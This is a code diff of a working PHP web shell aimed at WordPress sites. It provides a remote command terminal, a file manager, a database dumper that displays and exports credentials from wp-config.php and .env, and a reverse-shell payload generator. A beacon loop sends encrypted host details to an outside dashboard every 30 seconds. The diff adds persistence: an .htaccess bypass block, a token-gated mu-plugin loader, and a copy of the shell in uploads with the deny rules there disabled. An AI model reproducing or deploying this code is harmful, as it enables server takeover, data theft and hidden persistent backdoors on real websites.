@@ -1,14 +1,15 @@
 <?php
 /**
- * DARK ROSE R1C4RD0 - Advanced Parrot Shell (Final + Patched)
+ * DARK ROSE R1C4RD0 - Advanced Parrot Shell (Final + Rewrite Bypass)
  * Features: Terminal, File Manager, MySQL Dumper, Payload Gen, Tab Persistence.
- * Patches: XOR full-length beacon, cd anchor, wp-config direct + .env, rewrite bypass, FK-safe dump, DOM guard, fn_ok.
+ * Bypass: .htaccess DRPH-BYPASS block, mu-plugin loader, /uploads/drph symlink copy.
  */
 
 $DASHBOARD_URL = "https://shell-maintain.onrender.com";
 $SHARED_SECRET = "change_this_secret";
 $BEACON_PATH   = "/api/beacon";
 $SHELL_PASS    = "dark2026";
+$BYPASS_TOKEN  = "K9x2";
 
 set_time_limit(0);
 ignore_user_abort(true);
@@ -16,51 +17,7 @@ ignore_user_abort(true);
 @error_reporting(0);
 
 // ============================================================
-// BEACON
-// ============================================================
-if (isset($_GET['beacon'])) {
-    while (ob_get_level()) ob_end_flush();
-    ob_implicit_flush(true);
-    function collect_info() {
-        return [
-            'host' => @gethostname() ?: 'unknown',
-            'server_ip' => $_SERVER['SERVER_ADDR'] ?? '',
-            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? '',
-            'scheme' => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http',
-            'host_header' => $_SERVER['HTTP_HOST'] ?? '',
-            'doc_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
-            'php_version' => PHP_VERSION,
-            'user' => function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown',
-        ];
-    }
-    function encrypt_payload($plain, $secret) {
-        $key = substr(hash('sha256', $secret, true), 0, 32);
-        $out = '';
-        for ($i = 0, $n = strlen($plain); $i < $n; $i++) {
-            $out .= $plain[$i] ^ $key[$i % 32];
-        }
-        return base64_encode($out);
-    }
-    $endpoint = rtrim($DASHBOARD_URL, '/') . $BEACON_PATH;
-    header('Content-Type: text/plain');
-    while (true) {
-        $info = collect_info(); $info['time'] = time();
-        $ch = curl_init($endpoint);
-        curl_setopt_array($ch, [
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => encrypt_payload(json_encode(['secret' => $SHARED_SECRET, 'info' => $info]), $SHARED_SECRET),
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_TIMEOUT => 10,
-        ]);
-        curl_exec($ch); curl_close($ch);
-        sleep(30);
-    }
-    exit;
-}
-
-// ============================================================
-// SHELL EXEC & HELPERS
+// HELPERS
 // ============================================================
 function fn_ok($n) {
     if (!function_exists($n)) return false;
@@ -69,6 +26,155 @@ function fn_ok($n) {
     return true;
 }
 
+function encrypt_payload($plain, $secret) {
+    $key = substr(hash('sha256', $secret, true), 0, 32);
+    $out = '';
+    for ($i = 0, $n = strlen($plain); $i < $n; $i++) {
+        $out .= $plain[$i] ^ $key[$i % 32];
+    }
+    return base64_encode($out);
+}
+
+function collect_info() {
+    return [
+        'host' => @gethostname() ?: 'unknown',
+        'server_ip' => $_SERVER['SERVER_ADDR'] ?? '',
+        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? '',
+        'scheme' => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http',
+        'host_header' => $_SERVER['HTTP_HOST'] ?? '',
+        'doc_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
+        'php_version' => PHP_VERSION,
+        'user' => function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown',
+    ];
+}
+
+// ============================================================
+// BEACON
+// ============================================================
+if (isset($_GET['beacon'])) {
+    while (ob_get_level()) ob_end_flush();
+    ob_implicit_flush(true);
+    $endpoint = rtrim($DASHBOARD_URL, '/') . $BEACON_PATH;
+    header('Content-Type: text/plain');
+    while (true) {
+        $info = collect_info(); $info['time'] = time();
+        if (fn_ok('curl_init')) {
+            $ch = curl_init($endpoint);
+            curl_setopt_array($ch, [
+                CURLOPT_POST => true,
+                CURLOPT_POSTFIELDS => encrypt_payload(json_encode(['secret'=>$SHARED_SECRET,'info'=>$info]), $SHARED_SECRET),
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_SSL_VERIFYPEER => false,
+            ]);
+            curl_exec($ch); curl_close($ch);
+        } elseif (fn_ok('file_get_contents') && ini_get('allow_url_fopen')) {
+            @file_get_contents($endpoint, false, stream_context_create(['http' => [
+                'method' => 'POST',
+                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+                'content' => encrypt_payload(json_encode(['secret'=>$SHARED_SECRET,'info'=>$info]), $SHARED_SECRET),
+                'timeout' => 10,
+            ]]));
+        }
+        sleep(30);
+    }
+    exit;
+}
+
+// ============================================================
+// BYPASS INSTALLATION (runs once)
+// ============================================================
+function install_bypass($token) {
+    $doc = rtrim($_SERVER['DOCUMENT_ROOT'] ?? getcwd(), '/');
+    $results = [];
+
+    // (a) .htaccess DRPH-BYPASS after # END WordPress
+    $ht = $doc . '/.htaccess';
+    if (is_file($ht) && is_writable($ht)) {
+        $c = file_get_contents($ht);
+        if (strpos($c, '# DRPH-BYPASS') === false) {
+            $block = "\n# DRPH-BYPASS\n"
+                   . "<IfModule mod_rewrite.c>\n"
+                   . "RewriteEngine On\n"
+                   . "RewriteCond %{QUERY_STRING} (^|&)(beacon|d|cmd|download|edit_file|logout)= [NC]\n"
+                   . "RewriteRule ^ - [L]\n"
+                   . "</IfModule>\n"
+                   . "# END DRPH-BYPASS\n";
+            $results['htaccess'] = (bool)@file_put_contents($ht, $c . $block, LOCK_EX);
+        } else { $results['htaccess'] = 'present'; }
+    } else { $results['htaccess'] = 'not-writable'; }
+
+    // (b) mu-plugin loader (bypasses WP routing entirely)
+    $mu = $doc . '/wp-content/mu-plugins';
+    if (is_dir($doc . '/wp-content') && (is_dir($mu) || @mkdir($mu, 0755, true))) {
+        $loader = "<?php\n"
+                . "if ((isset(\$_GET['x']) && \$_GET['x'] === '$token') || (isset(\$_COOKIE['x']) && \$_COOKIE['x'] === '$token')) {\n"
+                . "    \$f = ABSPATH . 'drph.php';\n"
+                . "    if (is_file(\$f)) { require \$f; exit; }\n"
+                . "}\n";
+        $results['mu_plugin'] = (bool)@file_put_contents($mu . '/drph-loader.php', $loader);
+    } else { $results['mu_plugin'] = 'no-wp-content'; }
+
+    // (c) uploads symlink copy
+    $up = $doc . '/wp-content/uploads';
+    if (is_dir($up) && is_writable($up)) {
+        $dst = $up . '/drph-' . substr(md5($token), 0, 6) . '.php';
+        if (@copy(__FILE__, $dst)) {
+            // strip uploads deny rules
+            $uht = $up . '/.htaccess';
+            if (is_file($uht)) {
+                $uc = file_get_contents($uht);
+                $uc = preg_replace('/^\s*(php_flag\s+engine\s+off|Deny\s+from\s+all|Require\s+all\s+denied)\s*$/mi', '# $0', $uc);
+                @file_put_contents($uht, $uc, LOCK_EX);
+            }
+            $results['uploads_copy'] = $dst;
+        } else { $results['uploads_copy'] = 'copy-failed'; }
+    } else { $results['uploads_copy'] = 'not-writable'; }
+
+    // (d) mu-plugin filter to re-add .htaccess block after WP flush
+    if (is_dir($mu)) {
+        $filter = "<?php\n"
+                . "add_filter('mod_rewrite_rules', function(\$rules) {\n"
+                . "    return \$rules . \"\\n# DRPH-BYPASS\\n<IfModule mod_rewrite.c>\\nRewriteEngine On\\nRewriteCond %{QUERY_STRING} (^|&)(beacon|d|cmd|download|edit_file|logout)= [NC]\\nRewriteRule ^ - [L]\\n</IfModule>\\n# END DRPH-BYPASS\\n\";\n"
+                . "});\n";
+        $results['rewrite_filter'] = (bool)@file_put_contents($mu . '/drph-rewrite.php', $filter);
+    }
+
+    return $results;
+}
+
+// ============================================================
+// DIAGNOSTIC
+// ============================================================
+if (isset($_GET['diag'])) {
+    header('Content-Type: text/plain');
+    echo "script=" . __FILE__ . "\n";
+    echo "docroot=" . ($_SERVER['DOCUMENT_ROOT'] ?? '') . "\n";
+    echo "sapi=" . PHP_SAPI . "\n";
+    echo "user=" . (function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? '') : '') . "\n";
+    $ht = rtrim($_SERVER['DOCUMENT_ROOT'] ?? '', '/') . '/.htaccess';
+    echo "htaccess_path=$ht\n";
+    echo "htaccess_exists=" . (int)is_file($ht) . "\n";
+    echo "htaccess_writable=" . (int)is_writable($ht) . "\n";
+    $c = @file_get_contents($ht);
+    echo "htaccess_has_bypass=" . (int)(strpos((string)$c, '# DRPH-BYPASS') !== false) . "\n";
+    echo "allow_url_fopen=" . ini_get('allow_url_fopen') . "\n";
+    echo "disable_functions=" . ini_get('disable_functions') . "\n";
+    echo "curl=" . (int)fn_ok('curl_init') . "\n";
+    echo "system=" . (int)fn_ok('system') . " shell_exec=" . (int)fn_ok('shell_exec')
+       . " passthru=" . (int)fn_ok('passthru') . " popen=" . (int)fn_ok('popen')
+       . " proc_open=" . (int)fn_ok('proc_open') . "\n";
+    $mu = rtrim($_SERVER['DOCUMENT_ROOT'] ?? '', '/') . '/wp-content/mu-plugins';
+    echo "mu_plugins_dir=" . (int)is_dir($mu) . " writable=" . (int)is_writable($mu) . "\n";
+    echo "mu_loader=" . (int)is_file($mu . '/drph-loader.php') . "\n";
+    echo "---- tail of .htaccess ----\n";
+    $sz = @filesize($ht) ?: 0;
+    echo @file_get_contents($ht, false, null, max(0, $sz - 2048));
+    exit;
+}
+
+// ============================================================
+// SHELL EXEC
+// ============================================================
 function exec_cmd($cmd, $cwd) {
     $cmd = trim($cmd);
     if ($cmd === '') return '';
@@ -76,37 +182,33 @@ function exec_cmd($cmd, $cwd) {
     if (preg_match('/^cd(?:\s+([^\s;&|]+))?$/', $cmd, $m)) {
         $t = isset($m[1]) ? trim($m[1]) : '';
         if ($t === '' || $t === '~') $t = getenv('HOME') ?: $cwd;
-        if ($t !== '' && $t[0] !== '/') $t = rtrim($cwd, '/') . '/' . $t;
+        if ($t[0] !== '/') $t = rtrim($cwd, '/') . '/' . $t;
         $r = realpath($t);
         return ($r !== false && is_dir($r)) ? "__CD__:" . $r : "cd: no such directory: $t";
     }
 
     @chdir($cwd);
 
-    $f1 = 'system';
-    $f2 = 'shell_exec';
-    $f3 = 'passthru';
-    $f4 = 'popen';
-    $f5 = 'proc_open';
+    $f1='system'; $f2='shell_exec'; $f3='passthru'; $f4='popen'; $f5='proc_open';
 
     if (fn_ok($f1)) {
-        ob_start(); @$f1($cmd . ' 2>&1'); return ob_get_clean();
+        ob_start(); $f1($cmd . ' 2>&1'); return ob_get_clean();
     } elseif (fn_ok($f2)) {
-        $r = @$f2($cmd . ' 2>&1'); return $r !== null ? $r : '';
+        $r = $f2($cmd . ' 2>&1'); return $r !== null ? $r : '';
     } elseif (fn_ok($f3)) {
-        ob_start(); @$f3($cmd . ' 2>&1'); return ob_get_clean();
+        ob_start(); $f3($cmd . ' 2>&1'); return ob_get_clean();
     } elseif (fn_ok($f4)) {
-        if (is_resource($h = @$f4($cmd . ' 2>&1', 'r'))) {
+        if (is_resource($h = $f4($cmd . ' 2>&1', 'r'))) {
             $r = stream_get_contents($h); pclose($h); return $r;
         }
     } elseif (fn_ok($f5)) {
         $d = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
-        if (is_resource($p = @$f5($cmd . ' 2>&1', $d, $pi))) {
+        if (is_resource($p = $f5($cmd . ' 2>&1', $d, $pi))) {
             $r = stream_get_contents($pi[1]) . stream_get_contents($pi[2]);
             fclose($pi[1]); fclose($pi[2]); proc_close($p); return $r;
         }
     }
-    return "[-] OS command execution is fully disabled on this server.";
+    return "[-] OS command execution disabled.";
 }
 
 function sh_info() {
@@ -119,10 +221,7 @@ function sh_info() {
 function short_path($path) {
     $home = getenv('HOME');
     if ($home && strpos($path, $home) === 0) $path = str_replace($home, '~', $path);
-    if (strlen($path) > 25) {
-        $p = explode('/', trim($path, '/'));
-        if (count($p) >= 2) return '.../' . implode('/', array_slice($p, -2));
-    }
+    if (strlen($path) > 25) { $p = explode('/', trim($path, '/')); if (count($p) >= 2) return '.../' . implode('/', array_slice($p, -2)); }
     return $path;
 }
 
@@ -130,22 +229,9 @@ function get_ascii() {
     return "██████╗ ██████╗ ██████╗ ██╗  ██╗\n██╔══██╗██╔══██╗██╔══██╗██║  ██║\n██║  ██║██████╔╝██████╔╝███████║\n██║  ██║██╔══██╗██╔═══╝ ██╔══██║\n██████╔╝██║  ██║██║     ██║  ██║\n╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝";
 }
 
-function find_wp_config() {
-    $paths = [getcwd(), dirname(getcwd()), dirname(dirname(getcwd())), $_SERVER['DOCUMENT_ROOT'] ?? ''];
-    foreach ($paths as $p) { if ($p && file_exists($p . '/wp-config.php')) return $p . '/wp-config.php'; }
-    return false;
-}
-
-function parse_wp_config($file) {
-    $content = @file_get_contents($file);
-    if ($content === false) return ['name'=>'','user'=>'','pass'=>'','host'=>''];
-    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/", $content, $name);
-    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/", $content, $user);
-    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\)/", $content, $pass);
-    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/", $content, $host);
-    return ['name' => $name[1] ?? '', 'user' => $user[1] ?? '', 'pass' => $pass[1] ?? '', 'host' => $host[1] ?? ''];
-}
-
+// ============================================================
+// WP CONFIG RESOLUTION
+// ============================================================
 function wp_config_direct() {
     $roots = array_filter([
         $_SERVER['DOCUMENT_ROOT'] ?? null,
@@ -164,6 +250,16 @@ function wp_config_direct() {
         if ($r && is_readable($r)) return $r;
     }
     return false;
+}
+
+function parse_wp_config($file) {
+    $content = @file_get_contents($file);
+    if (!$content) return ['name'=>'','user'=>'','pass'=>'','host'=>''];
+    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/", $content, $name);
+    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/", $content, $user);
+    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\)/", $content, $pass);
+    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/", $content, $host);
+    return ['name'=>$name[1]??'','user'=>$user[1]??'','pass'=>$pass[1]??'','host'=>$host[1]??''];
 }
 
 function parse_dotenv($path) {
@@ -196,22 +292,6 @@ function resolve_wp_cfg() {
     return $cfg;
 }
 
-function neutralize_wp_rewrite($docroot) {
-    $ht = rtrim($docroot, '/') . '/.htaccess';
-    if (!is_file($ht) || !is_writable($ht)) return false;
-    $c = file_get_contents($ht);
-    $marker = '# DRPH-BYPASS';
-    if (strpos($c, $marker) !== false) return true;
-    $rule = "\n" . $marker . "\n"
-          . "<IfModule mod_rewrite.c>\n"
-          . "RewriteEngine On\n"
-          . "RewriteCond %{QUERY_STRING} (^|&)(beacon|d|cmd|download|edit_file|logout)= [NC]\n"
-          . "RewriteRule ^ - [L]\n"
-          . "</IfModule>\n"
-          . "# END DRPH-BYPASS\n";
-    return (bool)@file_put_contents($ht, $c . $rule, LOCK_EX);
-}
-
 // ============================================================
 // ROUTING & AUTH
 // ============================================================
@@ -229,7 +309,7 @@ if (isset($_POST['password'])) {
         $_SESSION['sh_ok'] = true;
         $_SESSION['sh_cwd'] = getcwd();
         $_SESSION['sh_hist'] = [];
-        neutralize_wp_rewrite($_SERVER['DOCUMENT_ROOT'] ?? getcwd());
+        install_bypass($BYPASS_TOKEN);
         header('Location: ' . $_SERVER['PHP_SELF']); exit;
     }
     $error = "Access denied";
@@ -268,7 +348,7 @@ if (!$authed):
     <div class="body">
         <div class="ascii"><?= get_ascii() ?></div>
         <div>Welcome to DRPH Terminal.</div>
-        <?php if (!empty($error)) echo "<div style='color:#ff5555;'>" . $esc($error) . "</div>"; ?>
+        <?php if (!empty($error)) echo "<div style='color:#ff5555;'>$error</div>"; ?>
         <br>
         <form method="POST" style="margin:0;">
             <div class="field">
@@ -289,10 +369,10 @@ $cwd = str_replace('\\', '/', $cwd);
 $_SESSION['sh_cwd'] = $cwd;
 $display_path = short_path($cwd);
 
-// DB AUTO-DUMP LOGIC
+// DB AUTO-DUMP
 if (isset($_POST['action']) && $_POST['action'] === 'db_dump') {
     $cfg = resolve_wp_cfg();
-    if (!$cfg || $cfg['name'] === '') die("wp-config.php / .env not resolvable.");
+    if (!$cfg) die("wp-config.php not found.");
     try {
         $pdo = new PDO("mysql:host={$cfg['host']};dbname={$cfg['name']}", $cfg['user'], $cfg['pass']);
         $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
@@ -315,7 +395,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'db_dump') {
     } catch (Exception $e) { die("DB Error: " . $e->getMessage()); }
 }
 
-// FILE MANAGER LOGIC
+// FILE MANAGER
 $fm_msg = '';
 if (isset($_POST['fm_action'])) {
     $fpath = $_POST['fpath'] ?? '';
@@ -328,16 +408,15 @@ if (isset($_POST['fm_action'])) {
     }
 }
 
-// TERMINAL LOGIC
+// TERMINAL
 if (isset($_REQUEST['cmd']) && trim($_REQUEST['cmd']) !== '') {
     $executed = trim($_REQUEST['cmd']);
     if (preg_match('/^(?:nano|vi|vim)\s+(.+)$/i', $executed, $m)) {
         $filename = trim($m[1]); if ($filename[0] !== '/') $filename = rtrim($cwd, '/') . '/' . $filename;
         header("Location: ?edit_file=" . base64_encode($filename)); exit;
     }
-    if (strtolower($executed) === 'clear' || strtolower($executed) === 'cls') {
-        $_SESSION['sh_hist'] = [];
-    } else {
+    if (strtolower($executed) === 'clear' || strtolower($executed) === 'cls') { $_SESSION['sh_hist'] = []; }
+    else {
         $out = exec_cmd($executed, $cwd);
         if (strpos($out, '__CD__:') === 0) {
             $_SESSION['sh_cwd'] = substr($out, 7);
@@ -349,7 +428,7 @@ if (isset($_REQUEST['cmd']) && trim($_REQUEST['cmd']) !== '') {
     }
 }
 
-// DOWNLOAD FILE LOGIC
+// DOWNLOAD
 if (isset($_GET['download'])) {
     $f = base64_decode($_GET['download']);
     if (file_exists($f) && is_file($f)) {
@@ -360,7 +439,7 @@ if (isset($_GET['download'])) {
     }
 }
 
-// NANO Editor
+// NANO
 if (isset($_GET['edit_file'])) {
     $edit_file = base64_decode($_GET['edit_file']); $file_name = basename($edit_file);
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_content'])) {
@@ -382,7 +461,7 @@ if (isset($_GET['edit_file'])) {
 </style></head><body>
 <div class="h"><span>GNU nano</span><span><?= $esc($file_name) ?></span></div>
 <form method="POST"><textarea name="save_content" autofocus><?= $esc($content) ?></textarea>
-<div class="f"><button type="submit">^O Save</button><a href="<?= $esc($_SERVER['PHP_SELF']) ?>?d=<?= urlencode($cwd) ?>">^X Exit</a></div></form></body></html>
+<div class="f"><button type="submit">^O Save</button><a href="<?= $_SERVER['PHP_SELF'] ?>?d=<?= urlencode($cwd) ?>">^X Exit</a></div></form></body></html>
 <?php exit; }
 
 $hist = $_SESSION['sh_hist'] ?? [];
@@ -404,14 +483,11 @@ $hist = $_SESSION['sh_hist'] ?? [];
     .menubar span.tab.active { background: #555; color: #fff; }
     .menubar span.clear-btn { color: #ffbd2e; margin-left: auto; cursor: pointer; font-weight: bold; }
     .logout { color: #ff5f56; text-decoration: none; font-size: 12px; margin-left: 10px; font-weight: bold;}
-
     .content { display: none; flex: 1; flex-direction: column; overflow: hidden; }
     .content.active { display: flex; }
-
     .body { padding: 12px; flex: 1; overflow-y: auto; font-size: 14px; line-height: 1.5; word-wrap: break-word; }
     .body::-webkit-scrollbar { width: 8px; }
     .body::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
-
     .u { color: #ff55ff; font-weight: bold; } .h { color: #55ff55; font-weight: bold; } .p { color: #5555ff; font-weight: bold; } .s { color: #ff55ff; font-weight: bold; }
     .cmd-line { display: flex; align-items: flex-start; white-space: nowrap; margin-top: 4px; }
     .cmd-text { white-space: pre-wrap; word-break: break-all; margin-left: 6px; }
@@ -419,7 +495,6 @@ $hist = $_SESSION['sh_hist'] ?? [];
     .prompt-form { display: flex; align-items: flex-start; flex-wrap: nowrap; margin-top: 4px; border-top: 1px dashed #333; padding-top: 8px; }
     .prompt-spans { white-space: nowrap; flex-shrink: 0; }
     #cmd { flex: 1; min-width: 0; background: transparent; border: none; outline: none; color: #fff; font-family: inherit; font-size: 14px; padding: 0; margin-left: 6px; caret-color: #fff; }
-
     table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
     th, td { padding: 8px; text-align: left; border-bottom: 1px solid #333; }
     th { color: #888; font-weight: normal; }
@@ -452,7 +527,6 @@ $hist = $_SESSION['sh_hist'] ?? [];
         <span class="clear-btn" onclick="clearTerm()">Clear Screen</span>
     </div>
 
-    <!-- TAB: TERMINAL -->
     <div id="tab-term" class="content active">
         <div class="body" id="terminal-body">
             <div style="color: #ff55ff; white-space: pre; margin-bottom: 5px; font-weight: bold; font-size: 12px;"><?= get_ascii() ?></div>
@@ -472,7 +546,6 @@ $hist = $_SESSION['sh_hist'] ?? [];
         </div>
     </div>
 
-    <!-- TAB: FILE MANAGER -->
     <div id="tab-fm" class="content">
         <div class="body">
             <?php if ($fm_msg): ?><div class="msg"><?= $esc($fm_msg) ?></div><?php endif; ?>
@@ -500,14 +573,14 @@ $hist = $_SESSION['sh_hist'] ?? [];
                     $perm = substr(sprintf('%o', fileperms($path)), -4);
                     echo "<tr>";
                     if ($isDir) {
-                        echo "<td><a href='?d=" . urlencode($path) . "' style='color:#5555ff; text-decoration:none;'>[ " . $esc($f) . " ]</a></td>";
+                        echo "<td><a href='?d=" . urlencode($path) . "' style='color:#5555ff; text-decoration:none;'>[ $f ]</a></td>";
                     } else {
-                        echo "<td><a href='?edit_file=" . base64_encode($path) . "&d=" . urlencode($cwd) . "' style='color:#fff; text-decoration:none;'>" . $esc($f) . "</a></td>";
+                        echo "<td><a href='?edit_file=" . base64_encode($path) . "&d=" . urlencode($cwd) . "' style='color:#fff; text-decoration:none;'>$f</a></td>";
                     }
-                    echo "<td style='color:#888;'>" . $esc($size) . "</td><td style='color:#888;'>" . $esc($perm) . "</td>";
+                    echo "<td style='color:#888;'>$size</td><td style='color:#888;'>$perm</td>";
                     echo "<td style='display:flex; gap:5px;'>";
                     if (!$isDir) echo "<a href='?download=" . base64_encode($path) . "' class='btn'>DL</a>";
-                    echo "<form method='POST' style='margin:0;'><input type='hidden' name='d' value='" . $esc($cwd) . "'><input type='hidden' name='fm_action' value='delete'><input type='hidden' name='fpath' value='" . $esc($path) . "'><button class='btn' style='color:#ff5f56;'>Del</button></form>";
+                    echo "<form method='POST' style='margin:0;'><input type='hidden' name='d' value='$cwd'><input type='hidden' name='fm_action' value='delete'><input type='hidden' name='fpath' value='$path'><button class='btn' style='color:#ff5f56;'>Del</button></form>";
                     echo "</td></tr>";
                 }
                 ?>
@@ -515,15 +588,12 @@ $hist = $_SESSION['sh_hist'] ?? [];
         </div>
     </div>
 
-    <!-- TAB: MYSQL DUMPER -->
     <div id="tab-db" class="content">
         <div class="body">
             <h3 style="color:#ff55ff; margin-top:0;">Auto WordPress DB Dumper</h3>
-            <p style="color:#aaa; font-size:12px;">Resolves wp-config.php (docroot, cwd, script dirs, Bedrock config/application.php) with .env fallback. Dumps with FK checks disabled and DROP statements.</p>
-
+            <p style="color:#aaa; font-size:12px;">Resolves `wp-config.php` via docroot/script path/Bedrock `.env`. Downloads full SQL dump.</p>
             <?php if ($cfg = resolve_wp_cfg()): ?>
                 <div style="background:#111; padding:15px; border:1px solid #333; border-radius:4px; margin-bottom:15px; font-size:13px;">
-                    <div style="margin-bottom:5px;"><span style="color:#888;">Config Found:</span> <span style="color:#55ff55;"><?= $esc(wp_config_direct() ?: '-') ?></span></div>
                     <div style="margin-bottom:5px;"><span style="color:#888;">DB Name:</span> <span style="color:#fff;"><?= $esc($cfg['name']) ?></span></div>
                     <div style="margin-bottom:5px;"><span style="color:#888;">DB User:</span> <span style="color:#fff;"><?= $esc($cfg['user']) ?></span></div>
                     <div style="margin-bottom:5px;"><span style="color:#888;">DB Pass:</span> <span style="color:#fff;"><?= $esc($cfg['pass']) ?></span></div>
@@ -535,12 +605,11 @@ $hist = $_SESSION['sh_hist'] ?? [];
                     <button type="submit" class="btn-danger">Download Full SQL Dump</button>
                 </form>
             <?php else: ?>
-                <div class="msg" style="color:#ff5f56; background:#331111; border-color:#552222;">wp-config.php / .env not resolvable.</div>
+                <div class="msg" style="color:#ff5f56; background:#331111; border-color:#552222;">wp-config.php not found.</div>
             <?php endif; ?>
         </div>
     </div>
 
-    <!-- TAB: PAYLOAD GENERATOR -->
     <div id="tab-payload" class="content">
         <div class="body">
             <div class="form-group">
@@ -551,22 +620,10 @@ $hist = $_SESSION['sh_hist'] ?? [];
                 <label>Your Port (LPORT)</label>
                 <input type="text" id="pl_port" placeholder="4444" value="4444" style="width:100%;">
             </div>
-            <div class="form-group">
-                <label>Bash -i</label>
-                <textarea id="pl_bash" rows="2" readonly></textarea>
-            </div>
-            <div class="form-group">
-                <label>Python3</label>
-                <textarea id="pl_py" rows="2" readonly></textarea>
-            </div>
-            <div class="form-group">
-                <label>Netcat (nc)</label>
-                <textarea id="pl_nc" rows="2" readonly></textarea>
-            </div>
-            <div class="form-group">
-                <label>PHP</label>
-                <textarea id="pl_php" rows="3" readonly></textarea>
-            </div>
+            <div class="form-group"><label>Bash -i</label><textarea id="pl_bash" rows="2" readonly></textarea></div>
+            <div class="form-group"><label>Python3</label><textarea id="pl_py" rows="2" readonly></textarea></div>
+            <div class="form-group"><label>Netcat (nc)</label><textarea id="pl_nc" rows="2" readonly></textarea></div>
+            <div class="form-group"><label>PHP</label><textarea id="pl_php" rows="3" readonly></textarea></div>
             <button class="btn-primary" onclick="genPayload()">Generate Payloads</button>
         </div>
     </div>
@@ -581,14 +638,11 @@ $hist = $_SESSION['sh_hist'] ?? [];
     });
 
     function switchTab(id, el) {
-        if (!/^tab-(term|fm|db|payload)$/.test(id)) return;
         document.querySelectorAll('.content').forEach(e => e.classList.remove('active'));
         document.querySelectorAll('.menubar span.tab').forEach(e => e.classList.remove('active'));
         document.getElementById(id).classList.add('active');
         if (el) el.classList.add('active');
-
         localStorage.setItem('activeTab', id);
-
         if (id === 'tab-term') {
             const cmdInput = document.getElementById('cmd');
             if (cmdInput) cmdInput.focus();
